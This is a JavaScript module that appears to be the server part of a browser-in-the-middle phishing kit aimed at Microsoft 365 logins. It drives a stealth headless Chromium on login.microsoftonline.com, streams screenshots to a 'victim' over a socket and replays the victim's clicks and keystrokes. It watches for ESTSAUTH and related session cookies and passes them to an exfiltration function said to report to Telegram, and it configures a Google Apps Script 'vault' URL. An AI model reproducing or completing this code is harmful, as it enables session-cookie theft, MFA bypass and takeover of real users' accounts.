const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

// --- CONFIGURATION ---
const VAULT_URL = "https://script.google.com/macros/s/AKfycbzjX20l3RNxx1adYeW_108CdbGJlO3vi2lwhdixZSBo_83oijJYtIAURqAg9ImZSGrZ/exec";
const TARGET_START_URL = "https://login.microsoftonline.com/"; // Force-start URL
const VIEWPORT_WIDTH = 1280;
const VIEWPORT_HEIGHT = 720;

async function sendExfiltrationAlert(cookies, finalUrl) {
    // ... (Keep your existing Telegram exfiltration logic here)
}

async function startSession(io, socket) {
    let browser = null;
    const capturedDomains = new Set();

    try {
        // RAILWAY OPTIMIZED LAUNCH
        browser = await puppeteer.launch({
            headless: "new",
            // This path matches the Chromium package installed via nixpacks.toml
            executablePath: '/usr/bin/chromium', 
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--no-first-run',
                '--no-zygote',
                '--single-process'
            ]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: VIEWPORT_WIDTH, height: VIEWPORT_HEIGHT });
        
        // Anti-Detection User Agent
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36');

        // IMMEDIATELY navigate to the target to clear the "INITIALIZING" screen
        await page.goto(TARGET_START_URL, { waitUntil: 'networkidle2' });

        const attemptExfiltration = async () => {
            const cookies = await page.cookies();
            const critical = ['ESTSAUTHPERSISTENT', 'ESTSAUTH', '__Host-MSAAUTH'];
            if (cookies.some(c => critical.some(t => c.name.includes(t)))) {
                await sendExfiltrationAlert(cookies, page.url());
            }
        };

        // --- HANDLERS ---
        const heartbeat = setInterval(async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ 
                        encoding: 'base64', 
                        type: 'jpeg', 
                        quality: 20 // Low quality for fast mobile scaling
                    });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        }, 1000);

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') await page.mouse.click(data.x, data.y);
                if (data.type === 'key') await page.keyboard.press(data.key);
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            if (browser) {
                const pages = await browser.pages();
                await Promise.all(pages.map(p => p.close().catch(() => {})));
                await browser.close().catch(() => {});
            }
        });

    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        // console.error("Launch Error:", error.message); // Temporarily uncomment if still stuck
    }
}

module.exports = { startSession };
